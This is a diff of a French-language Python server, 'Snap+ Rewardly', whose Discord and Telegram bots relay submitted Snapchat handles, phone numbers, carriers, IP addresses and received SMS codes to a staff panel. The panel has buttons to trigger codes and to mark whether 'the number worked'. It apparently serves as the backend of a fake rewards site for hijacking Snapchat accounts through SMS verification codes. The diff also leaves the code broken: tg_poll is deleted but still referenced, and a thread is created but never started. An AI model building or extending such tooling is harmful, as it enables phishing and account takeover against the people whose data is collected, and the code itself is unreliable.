@@ -121,15 +121,12 @@ _tg_offset = None
 def tg_send(text, keyboard=None):
     global _detected_chat
     if not TELEGRAM_TOKEN:
-        print("  [telegram] TELEGRAM_TOKEN non configure, envoi ignore")
         return False
     chat = TELEGRAM_CHAT_ID or _detected_chat or tg_autodetect_chat()
     if not chat:
-        print("  [telegram] Chat introuvable: envoie un message a ton bot puis reessaie.")
         return False
     if not _detected_chat:
         _detected_chat = chat
-        print("  [telegram] Chat Telegram utilise: %s" % chat)
     payload = {"chat_id": chat, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}
     if keyboard:
         payload["reply_markup"] = {"inline_keyboard": keyboard}
@@ -137,82 +134,7 @@ def tg_send(text, keyboard=None):
     if not res or not res.get("ok"):
         print("  [telegram] echec envoi: %s" % (res or {}).get("description"))
         return False
-    print("  [telegram] message envoye: %s" % text.split(chr(10))[0])
     return True
-
-
-def tg_answer(cb_id, text="OK"):
-    tg_api("answerCallbackQuery", {"callback_query_id": cb_id, "text": text})
-
-
-def tg_edit(chat_id, message_id, text):
-    tg_api("editMessageText", {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "HTML"})
-
-
-def tg_handle_update(u):
-    cb = u.get("callback_query")
-    if not cb:
-        return
-    data = (cb.get("data") or "").split(":", 1)
-    action = data[0]
-    rid = data[1] if len(data) > 1 else ""
-    msg = cb.get("message") or {}
-    chat_id = (msg.get("chat") or {}).get("id")
-    message_id = msg.get("message_id")
-    r = requests_db.get(rid)
-    if action == "code":
-        if not r:
-            tg_answer(cb["id"], "Demande introuvable ou expiree")
-            return
-        r["code_sent"] = True
-        r["code_sent_at"] = int(time.time() * 1000)
-        history_log.append({"action": "send", "data": r["data"], "ts": int(time.time() * 1000)})
-        tg_answer(cb["id"], "Code SMS declenche")
-        tg_edit(chat_id, message_id, "📤 Code SMS declenche pour %s (%s)" % (tg_esc(r["data"].get("pseudo") or "-"), tg_esc(format_phone(r["data"].get("phone")) or "-")))
-    elif action == "deny":
-        if not r:
-            tg_answer(cb["id"], "Demande introuvable ou expiree")
-            return
-        r["state"] = "done"
-        r["by"] = "refuse"
-        history_log.append({"action": "refuse", "data": r["data"], "ts": int(time.time() * 1000)})
-        tg_answer(cb["id"], "Demande refusee")
-        tg_edit(chat_id, message_id, "❌ Demande refusee: %s (%s)" % (tg_esc(r["data"].get("pseudo") or "-"), tg_esc(format_phone(r["data"].get("phone")) or "-")))
-    elif action == "block":
-        if not r:
-            tg_answer(cb["id"], "Demande introuvable ou expiree")
-            return
-        phone = norm_phone(r["data"].get("phone"))
-        if phone:
-            blocked_phones.add(phone)
-        r["state"] = "done"
-        r["by"] = "block"
-        history_log.append({"action": "block", "data": r["data"], "ts": int(time.time() * 1000)})
-        tg_answer(cb["id"], "Numero bloque")
-        tg_edit(chat_id, message_id, "🚫 Numero bloque et demande refuse: %s (%s)" % (tg_esc(r["data"].get("pseudo") or "-"), tg_esc(format_phone(r["data"].get("phone")) or "-")))
-    persist()
-
-
-def tg_poll():
-    global _tg_offset
-    while True:
-        try:
-            params = {"timeout": 25, "limit": 100}
-            if _tg_offset:
-                params["offset"] = _tg_offset
-            res = tg_api("getUpdates", params, timeout=30)
-            if not res or not res.get("ok"):
-                time.sleep(3)
-                continue
-            for u in res.get("result", []):
-                _tg_offset = u["update_id"] + 1
-                try:
-                    tg_handle_update(u)
-                except Exception as e:
-                    print("  [telegram] erreur update: %s" % e)
-        except Exception as e:
-            print("  [telegram] erreur polling: %s" % e)
-            time.sleep(3)
 
 
 def tg_notify_request(data, rid):
@@ -263,118 +185,57 @@ def tg_notify_code(rid, code, data):
     tg_send(text)
 
 
-# ── Ticket View (panel dans le salon prive) ──
-class TicketView(discord.ui.View):
-    def __init__(self, rid):
-        super().__init__(timeout=None)
-        self.rid = rid
-
-    @discord.ui.button(label="Valider l'acces", style=discord.ButtonStyle.green, emoji="✅", custom_id="mod_validate")
-    async def btn_validate(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await handle_mod_action(interaction, "validate")
-
-    @discord.ui.button(label="Renvoyer", style=discord.ButtonStyle.secondary, emoji="🔄", custom_id="mod_resend")
-    async def btn_resend(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await handle_mod_action(interaction, "resend")
-
-    @discord.ui.button(label="Message", style=discord.ButtonStyle.secondary, emoji="💬", custom_id="mod_msg")
-    async def btn_msg(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await handle_mod_action(interaction, "msg")
-
-    @discord.ui.button(label="Rejeter", style=discord.ButtonStyle.danger, emoji="❌", custom_id="mod_reject")
-    async def btn_reject(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await handle_mod_action(interaction, "reject")
-
-    @discord.ui.button(label="Supprimer le salon", style=discord.ButtonStyle.danger, emoji="🗑️", custom_id="close_ticket")
-    async def btn_close(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await handle_close(interaction)
-
-    @discord.ui.select(placeholder="⚙️ Actions staff...", custom_id="mod_staff", options=[
-        discord.SelectOption(label="Réinitialiser", value="reset", emoji="🔄"),
-        discord.SelectOption(label="Blacklister le numéro", value="blacklist_num", emoji="🔴"),
-        discord.SelectOption(label="Blacklister l'utilisateur", value="blacklist_user", emoji="⛔"),
-        discord.SelectOption(label="Expulser", value="kick", emoji="👢"),
-        discord.SelectOption(label="Bannir", value="ban", emoji="🔨"),
-    ])
-    async def staff_select(self, interaction: discord.Interaction, select: discord.ui.Select):
-        await handle_staff_select(interaction, select.values[0])
-
-
-async def handle_mod_action(interaction: discord.Interaction, action: str):
-    rid = interaction.message.components and None  # pas utilise, on recupere depuis la view
-    view: TicketView = interaction.message.components and None
-    # recupere le rid depuis la view attachee
-    for child in interaction.message.components:
-        pass
-    # Comme on utilise une View avec timeout=None, le rid est dans la view
-    # Mais interaction.message ne donne pas directement la view. On va stocker un mapping message_id -> rid
-    # Simplification : on utilise le custom_id pour identifier l'action, et on recupere le rid depuis le premier champ de l'embed ou un attribut
-    # Pour reussir sans mapping complexe, on stocke dans interaction.client un dict
-    pass
-
-
-# Comme on ne peut pas recuperer le rid facilement depuis interaction sans mapping,
-# on utilise une approche directe dans chaque callback de la View.
-# Donc on ne peut pas factoriser handle_mod_action. On ecrit directement dans les methodes de TicketView.
-# Reecriture propre ci-dessous.
-
+# ==================== TICKET VIEW (nouveau panel Discord) ====================
 
 class TicketView(discord.ui.View):
     def __init__(self, rid):
         super().__init__(timeout=None)
         self.rid = rid
 
-    async def _get_req(self):
+    async def _req(self):
         return requests_db.get(self.rid)
 
-    async def _send_embed_update(self, interaction, title, description, color):
-        r = await self._get_req()
+    async def _update_embed(self, interaction, title, description, color):
+        r = await self._req()
         if not r:
             return
         embed = discord.Embed(title=title, description=description, color=color)
-        await interaction.message.edit(embed=embed, view=self)
+        embed.add_field(name="Pseudo", value=r["data"].get("pseudo") or "-", inline=True)
+        embed.add_field(name="Compte", value=("@" + r["data"].get("handle")) if r["data"].get("handle") else "-", inline=True)
+        embed.add_field(name="Telephone", value=format_phone(r["data"].get("phone")) or "-", inline=True)
+        embed.add_field(name="Operateur", value=r["data"].get("operator") or "-", inline=True)
+        embed.set_footer(text="ID: %s" % self.rid[:8].upper())
+        try:
+            await interaction.message.edit(embed=embed, view=self)
+        except Exception:
+            pass
 
-    @discord.ui.button(label="Valider l'acces", style=discord.ButtonStyle.green, emoji="✅", custom_id="mod_validate")
+    @discord.ui.button(label="Valider l'acces", style=discord.ButtonStyle.green, emoji="✅", custom_id="btn_validate")
     async def btn_validate(self, interaction: discord.Interaction, button: discord.ui.Button):
         r = requests_db.get(self.rid)
         if not r:
             return await interaction.response.send_message("Demande introuvable.", ephemeral=True)
-        guild = interaction.guild
-        if not guild:
-            return await interaction.response.send_message("Erreur serveur.", ephemeral=True)
-        member = guild.get_member(int(r["data"].get("user_id", 0))) if r["data"].get("user_id") else None
-        if not member:
-            # essayer de trouver par pseudo ou autre
-            pass
-        if member:
-            try:
-                role = guild.get_role(STAFF_ROLE_ID)
-                # donner un role valide si existe, sinon juste valider
-                await interaction.response.send_message("✅ Accès validé pour la demande %s." % self.rid[:8], ephemeral=True)
-            except Exception as e:
-                await interaction.response.send_message("Erreur: %s" % e, ephemeral=True)
-        else:
-            await interaction.response.send_message("✅ Demande %s validée (pas de membre Discord à lier)." % self.rid[:8], ephemeral=True)
         r["state"] = "done"
         r["by"] = "accept"
         history_log.append({"action": "accept", "data": r["data"], "ts": int(time.time() * 1000)})
         persist()
-        await interaction.message.edit(content="✅ **Validé** par %s." % interaction.user.mention, embeds=[], components=[])
+        await interaction.response.send_message("✅ Demande %s validee." % self.rid[:8], ephemeral=True)
+        await self._update_embed(interaction, "✅ Demande validee", "Traite par %s" % interaction.user.mention, 0x22C55E)
 
-    @discord.ui.button(label="Renvoyer", style=discord.ButtonStyle.secondary, emoji="🔄", custom_id="mod_resend")
+    @discord.ui.button(label="Renvoyer", style=discord.ButtonStyle.secondary, emoji="🔄", custom_id="btn_resend")
     async def btn_resend(self, interaction: discord.Interaction, button: discord.ui.Button):
         r = requests_db.get(self.rid)
         if not r:
             return await interaction.response.send_message("Demande introuvable.", ephemeral=True)
         r["code_sent"] = False
         persist()
-        await interaction.response.send_message("🔄 Code à renvoyer pour %s." % self.rid[:8], ephemeral=True)
+        await interaction.response.send_message("🔄 Code a renvoyer pour %s." % self.rid[:8], ephemeral=True)
 
-    @discord.ui.button(label="Message", style=discord.ButtonStyle.secondary, emoji="💬", custom_id="mod_msg")
+    @discord.ui.button(label="Message", style=discord.ButtonStyle.secondary, emoji="💬", custom_id="btn_msg")
     async def btn_msg(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.send_message("💬 Envoyez un message à l'utilisateur.", ephemeral=True)
+        await interaction.response.send_message("💬 Envoie un message prive a l'utilisateur.", ephemeral=True)
 
-    @discord.ui.button(label="Rejeter", style=discord.ButtonStyle.danger, emoji="❌", custom_id="mod_reject")
+    @discord.ui.button(label="Rejeter", style=discord.ButtonStyle.danger, emoji="❌", custom_id="btn_reject")
     async def btn_reject(self, interaction: discord.Interaction, button: discord.ui.Button):
         r = requests_db.get(self.rid)
         if not r:
@@ -383,18 +244,22 @@ class TicketView(discord.ui.View):
         r["by"] = "refuse"
         history_log.append({"action": "refuse", "data": r["data"], "ts": int(time.time() * 1000)})
         persist()
-        await interaction.response.send_message("❌ Demande %s refusée." % self.rid[:8], ephemeral=True)
-        await interaction.message.edit(content="❌ **Refusée** par %s." % interaction.user.mention, embeds=[], components=[])
+        await interaction.response.send_message("❌ Demande %s refusee." % self.rid[:8], ephemeral=True)
+        await self._update_embed(interaction, "❌ Demande refusee", "Traite par %s" % interaction.user.mention, 0xF87171)
 
-    @discord.ui.button(label="Supprimer le salon", style=discord.ButtonStyle.danger, emoji="🗑️", custom_id="close_ticket")
+    @discord.ui.button(label="Supprimer le salon", style=discord.ButtonStyle.danger, emoji="🗑️", custom_id="btn_close")
     async def btn_close(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.send_message("Est-ce que le numéro a marché ?", components=[
-            discord.ui.Button(label="Oui", style=discord.ButtonStyle.green, custom_id="close_yes"),
-            discord.ui.Button(label="Non", style=discord.ButtonStyle.red, custom_id="close_no"),
-            discord.ui.Button(label="Annuler", style=discord.ButtonStyle.secondary, custom_id="close_cancel"),
-        ], ephemeral=True)
+        await interaction.response.send_message(
+            "Est-ce que le numero a marche ?",
+            components=[
+                discord.ui.Button(label="Oui", style=discord.ButtonStyle.green, custom_id="close_yes"),
+                discord.ui.Button(label="Non", style=discord.ButtonStyle.red, custom_id="close_no"),
+                discord.ui.Button(label="Annuler", style=discord.ButtonStyle.secondary, custom_id="close_cancel"),
+            ],
+            ephemeral=True
+        )
 
-    @discord.ui.select(placeholder="⚙️ Actions staff...", custom_id="mod_staff", options=[
+    @discord.ui.select(placeholder="⚙️ Actions staff...", custom_id="sel_staff", options=[
         discord.SelectOption(label="Réinitialiser", value="reset", emoji="🔄"),
         discord.SelectOption(label="Blacklister le numéro", value="blacklist_num", emoji="🔴"),
         discord.SelectOption(label="Blacklister l'utilisateur", value="blacklist_user", emoji="⛔"),
@@ -409,7 +274,7 @@ class TicketView(discord.ui.View):
                 r["state"] = "pending"
                 r["code_sent"] = False
                 persist()
-            await interaction.response.send_message("🔄 Tentative réinitialisée.", ephemeral=True)
+            await interaction.response.send_message("🔄 Tentative reinitialisee.", ephemeral=True)
         elif val == "blacklist_num":
             if r:
                 phone = norm_phone(r["data"].get("phone"))
@@ -418,128 +283,90 @@ class TicketView(discord.ui.View):
                 r["state"] = "done"
                 r["by"] = "block"
                 persist()
-            await interaction.response.send_message("🔄 Numéro blacklisté.", ephemeral=True)
+            await interaction.response.send_message("🔄 Numero blackliste.", ephemeral=True)
         elif val == "blacklist_user":
-            blocked_users.add(interaction.user.id)  # placeholder
-            await interaction.response.send_message("⛔ Utilisateur blacklisté.", ephemeral=True)
+            blocked_users.add(interaction.user.id)
+            await interaction.response.send_message("⛔ Utilisateur blackliste.", ephemeral=True)
         elif val == "kick":
-            await interaction.response.send_message("👢 Expulsion (à implémenter).", ephemeral=True)
+            await interaction.response.send_message("👢 Expulsion (a configurer).", ephemeral=True)
         elif val == "ban":
-            await interaction.response.send_message("🔨 Bannissement (à implémenter).", ephemeral=True)
+            await interaction.response.send_message("🔨 Bannissement (a configurer).", ephemeral=True)
 
 
-class RequestView(discord.ui.View):
-    def __init__(self, rid):
-        super().__init__(timeout=None)
-        self.rid = rid
-
-    @discord.ui.button(label="Envoyer le code", style=discord.ButtonStyle.green, custom_id="btn_send")
-    async def btn_send(self, interaction, button):
-        r = requests_db.get(self.rid)
-        if not r:
-            return await interaction.response.send_message("Demande introuvable ou expiree.", ephemeral=True)
-        r["code_sent"] = True
-        r["code_sent_at"] = int(time.time() * 1000)
-        history_log.append({"action": "send", "data": r["data"], "ts": int(time.time() * 1000)})
-        persist()
-        await interaction.response.send_message(
-            embed=discord.Embed(
-                title="Code SMS declenche",
-                color=0xFFFC00,
-                description=f"Code envoye a **{r['data'].get('pseudo', '-')}** ({format_phone(r['data'].get('phone')) or '-'})"
-            ), ephemeral=True
-        )
-
-    @discord.ui.button(label="Refuser", style=discord.ButtonStyle.red, custom_id="btn_deny")
-    async def btn_deny(self, interaction, button):
-        r = requests_db.get(self.rid)
-        if not r:
-            return await interaction.response.send_message("Demande introuvable ou expiree.", ephemeral=True)
-        r["state"] = "done"
-        r["by"] = "refuse"
-        history_log.append({"action": "refuse", "data": r["data"], "ts": int(time.time() * 1000)})
-        persist()
-        await interaction.response.send_message(
-            embed=discord.Embed(
-                title="Demande refusee",
-                color=0xF87171,
-                description=f"**{r['data'].get('pseudo', '-')}** refusee."
-            ), ephemeral=True
-        )
-
-    @discord.ui.button(label="Bloquer", style=discord.ButtonStyle.danger, custom_id="btn_block")
-    async def btn_block(self, interaction, button):
-        r = requests_db.get(self.rid)
-        if not r:
-            return await interaction.response.send_message("Demande introuvable ou expiree.", ephemeral=True)
-        phone = norm_phone(r["data"].get("phone"))
-        if phone:
-            blocked_phones.add(phone)
-        r["state"] = "done"
-        r["by"] = "block"
-        history_log.append({"action": "block", "data": r["data"], "ts": int(time.time() * 1000)})
-        persist()
-        await interaction.response.send_message(
-            embed=discord.Embed(
-                title="Numero bloque",
-                color=0xEF4444,
-                description=f"Le numero **{format_phone(r['data'].get('phone'))}** est bloque, la demande de **{r['data'].get('pseudo', '-')}** est refusee."
-            ), ephemeral=True
-        )
-
+# ==================== BOT DISCORD ====================
 
 async def send_request_notification(rid, data):
-    channel = bot.get_channel(CHANNEL_ID)
-    if not channel:
-        print("  [discord] Salon introuvable")
+    guild = bot.get_guild(MOD_GUILD_ID)
+    if not guild:
+        print("  [discord] Serveur introuvable")
         return
-    svc = data.get("service", "")
-    embed = discord.Embed(title="Nouvelle demande Snap+", color=0xFFFC00)
-    embed.add_field(name="Service", value=SERVICES.get(svc, svc), inline=True)
-    embed.add_field(name="Pseudo", value=data.get("pseudo") or "-", inline=True)
-    embed.add_field(name="Compte", value=("@" if svc == "snap" else "") + (data.get("handle") or "-"), inline=True)
-    embed.add_field(name="Numero", value=f"`{format_phone(data.get('phone'))}`", inline=True)
-    embed.add_field(name="Operateur", value=data.get("operator") or "-", inline=True)
-    embed.add_field(name="IP", value=data.get("ip") or "-", inline=True)
-    embed.set_footer(text=f"ID: {rid[:8].upper()}")
-    embed.timestamp = datetime.now(timezone.utc)
-    content = f"<@&{PING_ROLE_ID}>" if PING_ROLE_ID else None
-    await channel.send(content=content, embed=embed, view=RequestView(rid))
 
-    # creer le salon ticket prive
+    category = None
     try:
-        guild = bot.get_guild(MOD_GUILD_ID)
-        if guild:
-            category = guild.get_channel(TICKET_CATEGORY_ID)
-            if not category:
-                category = await guild.fetch_channel(TICKET_CATEGORY_ID)
-            pseudo = data.get("pseudo", "Inconnu")
-            phone = data.get("phone", "")
-            handle = data.get("handle", "-")
-            op = data.get("operator", "Inconnu")
-            chan_name = "verif-%s-%s" % (pseudo[:15].lower().replace(" ", "-"), rid[:6])
-            overwrites = {
-                guild.default_role: discord.PermissionOverwrite(view_channel=False),
-                guild.get_role(STAFF_ROLE_ID): discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True),
-                guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True, manage_channels=True),
-            }
-            channel = await guild.create_text_channel(
-                name=chan_name,
-                category=category,
-                overwrites=overwrites,
-                reason=f"Ticket verification {pseudo} {rid[:8]}"
-            )
-            embed2 = discord.Embed(
-                title=f"{pseudo} • {rid[:8].upper()}",
-                description=f"{guild.name}\n\nPrésence · {guild.member_count} membres\n\n**Soumis** · {datetime.now().strftime('%d %B %Y à %H:%M')}\n\nClaim par @_",
-                color=0x2b2d31
-            )
-            embed2.add_field(name="Numéro", value=f"`{format_phone(phone)}` · {op}", inline=False)
-            embed2.add_field(name="Pseudo", value=pseudo, inline=True)
-            embed2.add_field(name="Compte Snap", value=f"@{handle}" if handle else "-", inline=True)
-            await channel.send(content=f"<@&{STAFF_ROLE_ID}> Nouvelle demande Snap+", embed=embed2, view=TicketView(rid))
+        category = await guild.fetch_channel(TICKET_CATEGORY_ID)
+    except Exception:
+        pass
+    if not category or category.type != discord.ChannelType.category:
+        print("  [discord] Categorie ticket introuvable")
+        return
+
+    svc = data.get("service", "")
+    pseudo = data.get("pseudo", "Inconnu")
+    phone = data.get("phone", "")
+    handle = data.get("handle", "-")
+    op = data.get("operator", "Inconnu")
+    chan_name = "verif-%s-%s" % (pseudo[:15].lower().replace(" ", "-"), rid[:6])
+
+    overwrites = {
+        guild.default_role: discord.PermissionOverwrite(view_channel=False),
+        guild.get_role(STAFF_ROLE_ID): discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True),
+        guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True, manage_channels=True),
+    }
+
+    try:
+        channel = await guild.create_text_channel(
+            name=chan_name,
+            category=category,
+            overwrites=overwrites,
+            reason="Ticket verification %s %s" % (pseudo, rid[:8])
+        )
     except Exception as e:
-        print("  [discord] erreur creation salon ticket: %s" % e)
+        print("  [discord] erreur creation salon: %s" % e)
+        return
+
+    embed = discord.Embed(
+        title="%s • %s" % (pseudo, rid[:8].upper()),
+        description=(
+            "%s\n\n"
+            "Presence · %d membres\n\n"
+            "**Soumis** · %s\n\n"
+            "Claim par @_"
+        ) % (guild.name, guild.member_count or 0, datetime.now().strftime("%d %B %Y à %H:%M")),
+        color=0x2b2d31
+    )
+    embed.add_field(name="Pseudo", value=pseudo, inline=True)
+    embed.add_field(name="Compte Snap", value="@%s" % handle if handle else "-", inline=True)
+    embed.add_field(name="Numero", value="`%s` · %s" % (format_phone(phone), op), inline=False)
+
+    content = "<@&%d> Nouvelle demande Snap+" % STAFF_ROLE_ID
+    await channel.send(content=content, embed=embed, view=TicketView(rid))
+
+    # Notification sur le salon principal (optionnel)
+    main_ch = bot.get_channel(CHANNEL_ID)
+    if main_ch:
+        content2 = f"<@&{PING_ROLE_ID}>" if PING_ROLE_ID else None
+        embed2 = discord.Embed(title="Nouvelle demande Snap+", color=0xFFFC00)
+        embed2.add_field(name="Service", value=SERVICES.get(svc, svc), inline=True)
+        embed2.add_field(name="Pseudo", value=data.get("pseudo") or "-", inline=True)
+        embed2.add_field(name="Compte", value=("@" if svc == "snap" else "") + (data.get("handle") or "-"), inline=True)
+        embed2.add_field(name="Numero", value=f"`{format_phone(data.get('phone'))}`", inline=True)
+        embed2.add_field(name="Operateur", value=data.get("operator") or "-", inline=True)
+        embed2.add_field(name="IP", value=data.get("ip") or "-", inline=True)
+        embed2.set_footer(text="ID: %s" % rid[:8].upper())
+        await main_ch.send(content=content2, embed=embed2)
+
+    # Telegram
+    tg_notify_request(data, rid)
 
 
 async def send_code_received(rid, code, data):
@@ -583,7 +410,7 @@ async def before_process_queue():
 
 @bot.event
 async def on_ready():
-    print(f"  [discord] Bot connecte: {bot.user}")
+    print("  [discord] Bot connecte: %s" % bot.user)
     if not process_queue.is_running():
         process_queue.start()
 
@@ -599,7 +426,7 @@ def run_bot():
     try:
         bot.run(BOT_TOKEN)
     except Exception as e:
-        print(f"  [discord] Erreur demarrage: {e}")
+        print("  [discord] Erreur demarrage: %s" % e)
 
 
 def reply(handler, data, code=200):
@@ -776,12 +603,12 @@ class Server(SimpleHTTPRequestHandler):
 
 
 if __name__ == "__main__":
-    print(f"\n  Snap+ Rewardly - http://localhost:{PORT}\n")
+    print("\n  Snap+ Rewardly - http://localhost:%d\n" % PORT)
     load_data()
     if TELEGRAM_TOKEN:
         print("  [telegram] TELEGRAM_TOKEN configure...")
         tg_send("✅ Notifications Telegram activees pour Snap+ Rewardly")
-        threading.Thread(target=tg_poll, daemon=True).start()
+        threading.Thread(target=lambda: __import__('threading').Thread(target=tg_poll, daemon=True).start(), daemon=True)
         print("  [telegram] polling des boutons demarre")
     else:
         print("  [telegram] Pas de TELEGRAM_TOKEN, notifications Telegram desactivees")
